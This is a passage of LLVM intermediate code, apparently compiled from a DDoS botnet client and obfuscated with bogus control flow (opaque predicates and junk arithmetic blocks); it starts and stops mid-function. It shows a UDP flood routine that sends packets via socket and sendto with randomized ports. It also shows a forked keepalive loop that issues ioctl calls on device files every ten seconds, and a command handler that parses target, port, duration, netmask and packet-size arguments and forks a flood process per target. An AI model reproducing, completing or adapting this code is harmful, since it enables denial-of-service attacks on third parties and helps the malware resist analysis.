  store i32 %510, i32* %34, align 4
  %511 = load i32, i32* %35, align 4
  %512 = load i32, i32* %15, align 4
  %513 = icmp eq i32 %511, %512
  br i1 %513, label %514, label %534

; <label>:514:                                    ; preds = %508
  %515 = load i32, i32* @x.69
  %516 = load i32, i32* @y.70
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %514
  %523 = load i32, i32* %16, align 4
  %524 = mul nsw i32 %523, 1000
  %525 = call i32 @usleep(i32 %524)
  store i32 0, i32* %35, align 4
  %526 = load i32, i32* @x.69
  %527 = load i32, i32* @y.70
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart293, label %originalBB87alteredBB

originalBBpart293:                                ; preds = %originalBB87
  br label %419

; <label>:534:                                    ; preds = %508
  %535 = load i32, i32* %35, align 4
  %536 = add i32 %535, 1
  store i32 %536, i32* %35, align 4
  br label %419

; <label>:537:                                    ; preds = %506
  %538 = load i8*, i8** %30, align 8
  call void @llvm.stackrestore(i8* %538)
  br label %539

; <label>:539:                                    ; preds = %537, %258, %originalBBpart247, %231, %152, %originalBBpart216, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %39
  %540 = call i32 @rand_cmwc()
  %541 = trunc i32 %540 to i16
  %542 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %541, i16* %542, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %543 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 3
  %544 = getelementptr inbounds [8 x i8], [8 x i8]* %543, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %544, i8 0, i64 8, i32 4, i1 false)
  %545 = load i32, i32* %14, align 4
  store i32 %545, i32* %20, align 4
  %546 = load i32, i32* %12, align 4
  %547 = icmp eq i32 %546, 32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  %548 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %548, i32* %21, align 4
  %549 = load i32, i32* %21, align 4
  %550 = icmp ne i32 %549, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %128
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %153
  %551 = load i8*, i8** %22, align 8
  %552 = load i32, i32* %13, align 4
  %_ = sub i32 0, %552
  %gen = add i32 %_, 1
  %553 = add nsw i32 %552, 1
  %554 = sext i32 %553 to i64
  call void @llvm.memset.p0i8.i64(i8* %551, i8 0, i64 %554, i32 1, i1 false)
  %555 = load i8*, i8** %22, align 8
  %556 = load i32, i32* %13, align 4
  call void @RandString(i8* %555, i32 %556)
  %557 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %558 = load i32, i32* %11, align 4
  %_19 = sub i32 %557, %558
  %gen20 = mul i32 %_19, %558
  %_21 = sub i32 %557, %558
  %gen22 = mul i32 %_21, %558
  %_23 = sub i32 %557, %558
  %gen24 = mul i32 %_23, %558
  %_25 = shl i32 %557, %558
  %_26 = sub i32 0, %557
  %gen27 = add i32 %_26, %558
  %_28 = sub i32 0, %557
  %gen29 = add i32 %_28, %558
  %559 = add nsw i32 %557, %558
  store i32 %559, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %originalBB18

originalBB33alteredBB:                            ; preds = %originalBB33, %208
  %560 = load i32, i32* %16, align 4
  %_34 = shl i32 %560, 1000
  %_35 = shl i32 %560, 1000
  %_36 = shl i32 %560, 1000
  %_37 = sub i32 0, %560
  %gen38 = add i32 %_37, 1000
  %_39 = sub i32 %560, 1000
  %gen40 = mul i32 %_39, 1000
  %_41 = shl i32 %560, 1000
  %561 = mul nsw i32 %560, 1000
  %562 = call i32 @usleep(i32 %561)
  store i32 0, i32* %25, align 4
  br label %originalBB33

originalBB45alteredBB:                            ; preds = %originalBB45, %236
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %259
  store i32 50, i32* %28, align 4
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %276
  %563 = load i32, i32* %28, align 4
  %_54 = sub i32 0, %563
  %gen55 = add i32 %_54, -1
  %_56 = sub i32 %563, -1
  %gen57 = mul i32 %_56, -1
  %_58 = shl i32 %563, -1
  %_59 = sub i32 %563, -1
  %gen60 = mul i32 %_59, -1
  %_61 = shl i32 %563, -1
  %_62 = sub i32 0, %563
  %gen63 = add i32 %_62, -1
  %564 = add nsw i32 %563, -1
  store i32 %564, i32* %28, align 4
  %565 = icmp ne i32 %563, 0
  br label %originalBB53

originalBB67alteredBB:                            ; preds = %originalBB67, %304
  store i32 0, i32* %29, align 4
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %419
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %436
  %566 = load i32, i32* %26, align 4
  %567 = load i32, i32* %18, align 4
  %568 = sext i32 %567 to i64
  %_76 = sub i64 0, 32
  %gen77 = add i64 %_76, %568
  %_78 = sub i64 0, 32
  %gen79 = add i64 %_78, %568
  %_80 = sub i64 32, %568
  %gen81 = mul i64 %_80, %568
  %_82 = shl i64 32, %568
  %_83 = shl i64 32, %568
  %569 = add i64 32, %568
  %570 = trunc i64 %330 to i32
  %571 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %572 = call i64 @sendto(i32 %566, i8* %332, i64 %569, i32 %570, %struct.sockaddr* %571, i32 16)
  %573 = call i32 @rand_cmwc()
  %574 = trunc i32 %573 to i16
  %575 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %576 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %575, i32 0, i32 0
  %577 = bitcast %union.anon.2* %576 to %struct.anon.3*
  %578 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %577, i32 0, i32 0
  store i16 %574, i16* %578, align 2
  %579 = load i32, i32* %10, align 4
  %580 = icmp eq i32 %579, 0
  br label %originalBB75

originalBB87alteredBB:                            ; preds = %originalBB87, %514
  %581 = load i32, i32* %16, align 4
  %_88 = sub i32 0, %581
  %gen89 = add i32 %_88, 1000
  %_90 = sub i32 0, %581
  %gen91 = add i32 %_90, 1000
  %582 = mul nsw i32 %581, 1000
  %583 = call i32 @usleep(i32 %582)
  store i32 0, i32* %35, align 4
  br label %originalBB87
}

; Function Attrs: noinline nounwind uwtable
define void @ioctl_keepalive() #0 {
  %1 = load i32, i32* @x.71
  %2 = load i32, i32* @y.72
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = call i32 @fork() #2
  store i32 %12, i32* @ioctl_pid, align 4
  %13 = load i32, i32* @ioctl_pid, align 4
  %14 = icmp sgt i32 %13, 0
  %15 = load i32, i32* @x.71
  %16 = load i32, i32* @y.72
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %26, label %23

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @ioctl_pid, align 4
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %27

; <label>:26:                                     ; preds = %23, %originalBBpart2
  ret void

; <label>:27:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %28 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i32 0, i32 0), i32 2)
  store i32 %28, i32* %10, align 4
  %29 = icmp ne i32 %28, -1
  br i1 %29, label %36, label %30

; <label>:30:                                     ; preds = %27
  %31 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.99, i32 0, i32 0), i32 2)
  store i32 %31, i32* %10, align 4
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %36, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.100, i32 0, i32 0), i32 2)
  store i32 %34, i32* %10, align 4
  %35 = icmp ne i32 %34, -1
  br i1 %35, label %36, label %39

; <label>:36:                                     ; preds = %33, %30, %27
  store i32 0, i32* %11, align 4
  %37 = load i32, i32* %10, align 4
  %38 = call i32 (i32, i64, ...) @ioctl(i32 %37, i64 2147768068, i32* %9) #2
  br label %39

; <label>:39:                                     ; preds = %36, %33
  %40 = load i32, i32* @x.71
  %41 = load i32, i32* @y.72
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load i32, i32* %11, align 4
  %49 = icmp ne i32 %48, 0
  %50 = load i32, i32* @x.71
  %51 = load i32, i32* @y.72
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %49, label %58, label %63

; <label>:58:                                     ; preds = %originalBBpart24
  br label %59

; <label>:59:                                     ; preds = %59, %58
  %60 = load i32, i32* %10, align 4
  %61 = call i32 (i32, i64, ...) @ioctl(i32 %60, i64 2147768069, i32 0) #2
  %62 = call i32 @sleep(i32 10)
  br label %59

; <label>:63:                                     ; preds = %originalBBpart24
  call void @exit(i32 0) #14
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %0
  %64 = alloca i32, align 4
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = call i32 @fork() #2
  store i32 %67, i32* @ioctl_pid, align 4
  %68 = load i32, i32* @ioctl_pid, align 4
  %69 = icmp sgt i32 %68, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %70 = load i32, i32* %11, align 4
  %71 = icmp ne i32 %70, 0
  br label %originalBB1
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = load i32, i32* @x.73
  %4 = load i32, i32* @y.74
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i32, align 4
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i8*, align 8
  %54 = alloca i32, align 4
  %55 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %56 = load i8**, i8*** %12, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 0
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @strcmp(i8* %58, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  %60 = icmp ne i32 %59, 0
  %61 = load i32, i32* @x.73
  %62 = load i32, i32* @y.74
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %60, label %388, label %69

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* %11, align 4
  %71 = icmp slt i32 %70, 6
  br i1 %71, label %187, label %72

; <label>:72:                                     ; preds = %69
  %73 = load i8**, i8*** %12, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 3
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @atoi(i8* %75) #10
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %187, label %78

; <label>:78:                                     ; preds = %72
  %79 = load i32, i32* @x.73
  %80 = load i32, i32* @y.74
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i8**, i8*** %12, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 2
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @atoi(i8* %89) #10
  %91 = icmp eq i32 %90, -1
  %92 = load i32, i32* @x.73
  %93 = load i32, i32* @y.74
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %91, label %187, label %100

; <label>:100:                                    ; preds = %originalBBpart24
  %101 = load i8**, i8*** %12, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 4
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @atoi(i8* %103) #10
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %187, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i8**, i8*** %12, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 5
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @atoi(i8* %109) #10
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %187, label %112

; <label>:112:                                    ; preds = %106
  %113 = load i32, i32* @x.73
  %114 = load i32, i32* @y.74
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %112
  %121 = load i8**, i8*** %12, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 5
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @atoi(i8* %123) #10
  %125 = icmp sgt i32 %124, 65536
  %126 = load i32, i32* @x.73
  %127 = load i32, i32* @y.74
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %125, label %187, label %134

; <label>:134:                                    ; preds = %originalBBpart28
  %135 = load i32, i32* @x.73
  %136 = load i32, i32* @y.74
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %134
  %143 = load i8**, i8*** %12, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 5
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #10
  %147 = icmp sgt i32 %146, 65500
  %148 = load i32, i32* @x.73
  %149 = load i32, i32* @y.74
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %147, label %187, label %156

; <label>:156:                                    ; preds = %originalBBpart212
  %157 = load i8**, i8*** %12, align 8
  %158 = getelementptr inbounds i8*, i8** %157, i64 4
  %159 = load i8*, i8** %158, align 8
  %160 = call i32 @atoi(i8* %159) #10
  %161 = icmp sgt i32 %160, 32
  br i1 %161, label %187, label %162

; <label>:162:                                    ; preds = %156
  %163 = load i32, i32* %11, align 4
  %164 = icmp eq i32 %163, 7
  br i1 %164, label %165, label %188

; <label>:165:                                    ; preds = %162
  %166 = load i32, i32* @x.73
  %167 = load i32, i32* @y.74
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %165
  %174 = load i8**, i8*** %12, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 6
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @atoi(i8* %176) #10
  %178 = icmp slt i32 %177, 1
  %179 = load i32, i32* @x.73
  %180 = load i32, i32* @y.74
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %178, label %187, label %188

; <label>:187:                                    ; preds = %originalBBpart216, %156, %originalBBpart212, %originalBBpart28, %106, %100, %originalBBpart24, %72, %69
  br label %1471

; <label>:188:                                    ; preds = %originalBBpart216, %162
  %189 = load i8**, i8*** %12, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 1
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %13, align 8
  %192 = load i8**, i8*** %12, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  store i32 %195, i32* %14, align 4
  %196 = load i8**, i8*** %12, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 3
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @atoi(i8* %198) #10
  store i32 %199, i32* %15, align 4
  %200 = load i8**, i8*** %12, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 4
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @atoi(i8* %202) #10
  store i32 %203, i32* %16, align 4
  %204 = load i8**, i8*** %12, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 5
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #10
  store i32 %207, i32* %17, align 4
  %208 = load i32, i32* %11, align 4
  %209 = icmp sgt i32 %208, 6
  br i1 %209, label %210, label %215

; <label>:210:                                    ; preds = %188
  %211 = load i8**, i8*** %12, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 6
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  br label %216

; <label>:215:                                    ; preds = %188
  br label %216

; <label>:216:                                    ; preds = %215, %210
  %217 = phi i32 [ %214, %210 ], [ 1000, %215 ]
  %218 = load i32, i32* @x.73
  %219 = load i32, i32* @y.74
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %216
  store i32 %217, i32* %18, align 4
  %226 = load i32, i32* %11, align 4
  %227 = icmp sgt i32 %226, 7
  %228 = load i32, i32* @x.73
  %229 = load i32, i32* @y.74
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %227, label %236, label %241

; <label>:236:                                    ; preds = %originalBBpart220
  %237 = load i8**, i8*** %12, align 8
  %238 = getelementptr inbounds i8*, i8** %237, i64 7
  %239 = load i8*, i8** %238, align 8
  %240 = call i32 @atoi(i8* %239) #10
  br label %242

; <label>:241:                                    ; preds = %originalBBpart220
  br label %242

; <label>:242:                                    ; preds = %241, %236
  %243 = phi i32 [ %240, %236 ], [ 1000000, %241 ]
  %244 = load i32, i32* @x.73
  %245 = load i32, i32* @y.74
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %242
  store i32 %243, i32* %19, align 4
  %252 = load i32, i32* %11, align 4
  %253 = icmp sgt i32 %252, 8
  %254 = load i32, i32* @x.73
  %255 = load i32, i32* @y.74
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %253, label %262, label %267

; <label>:262:                                    ; preds = %originalBBpart224
  %263 = load i8**, i8*** %12, align 8
  %264 = getelementptr inbounds i8*, i8** %263, i64 8
  %265 = load i8*, i8** %264, align 8
  %266 = call i32 @atoi(i8* %265) #10
  br label %284

; <label>:267:                                    ; preds = %originalBBpart224
  %268 = load i32, i32* @x.73
  %269 = load i32, i32* @y.74
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %267
  %276 = load i32, i32* @x.73
  %277 = load i32, i32* @y.74
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %284

; <label>:284:                                    ; preds = %originalBBpart228, %262
  %285 = phi i32 [ %266, %262 ], [ 0, %originalBBpart228 ]
  %286 = load i32, i32* @x.73
  %287 = load i32, i32* @y.74
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %284
  store i32 %285, i32* %20, align 4
  %294 = load i8*, i8** %13, align 8
  %295 = call i8* @strstr(i8* %294, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %296 = icmp ne i8* %295, null
  %297 = load i32, i32* @x.73
  %298 = load i32, i32* @y.74
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %296, label %305, label %358

; <label>:305:                                    ; preds = %originalBBpart232
  %306 = load i32, i32* @x.73
  %307 = load i32, i32* @y.74
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %305
  %314 = load i8*, i8** %13, align 8
  %315 = call i8* @strtok(i8* %314, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %315, i8** %21, align 8
  %316 = load i32, i32* @x.73
  %317 = load i32, i32* @y.74
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %324

; <label>:324:                                    ; preds = %355, %originalBBpart236
  %325 = load i8*, i8** %21, align 8
  %326 = icmp ne i8* %325, null
  br i1 %326, label %327, label %357

; <label>:327:                                    ; preds = %324
  %328 = load i32, i32* @x.73
  %329 = load i32, i32* @y.74
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %327
  %336 = call i32 @listFork()
  %337 = icmp ne i32 %336, 0
  %338 = load i32, i32* @x.73
  %339 = load i32, i32* @y.74
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %337, label %355, label %346

; <label>:346:                                    ; preds = %originalBBpart240
  %347 = load i8*, i8** %21, align 8
  %348 = load i32, i32* %14, align 4
  %349 = load i32, i32* %15, align 4
  %350 = load i32, i32* %16, align 4
  %351 = load i32, i32* %17, align 4
  %352 = load i32, i32* %18, align 4
  %353 = load i32, i32* %19, align 4
  %354 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %347, i32 %348, i32 %349, i32 %350, i32 %351, i32 %352, i32 %353, i32 %354)
  call void @_exit(i32 0) #12
  unreachable

; <label>:355:                                    ; preds = %originalBBpart240
  %356 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %356, i8** %21, align 8
  br label %324

; <label>:357:                                    ; preds = %324
  br label %387

; <label>:358:                                    ; preds = %originalBBpart232
  %359 = call i32 @listFork()
  %360 = icmp ne i32 %359, 0
  br i1 %360, label %370, label %361

; <label>:361:                                    ; preds = %358
  %362 = load i8*, i8** %13, align 8
  %363 = load i32, i32* %14, align 4
  %364 = load i32, i32* %15, align 4
  %365 = load i32, i32* %16, align 4
  %366 = load i32, i32* %17, align 4
  %367 = load i32, i32* %18, align 4
  %368 = load i32, i32* %19, align 4
  %369 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %362, i32 %363, i32 %364, i32 %365, i32 %366, i32 %367, i32 %368, i32 %369)
  call void @_exit(i32 0) #12
  unreachable

; <label>:370:                                    ; preds = %358
  %371 = load i32, i32* @x.73
  %372 = load i32, i32* @y.74
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %370
  %379 = load i32, i32* @x.73
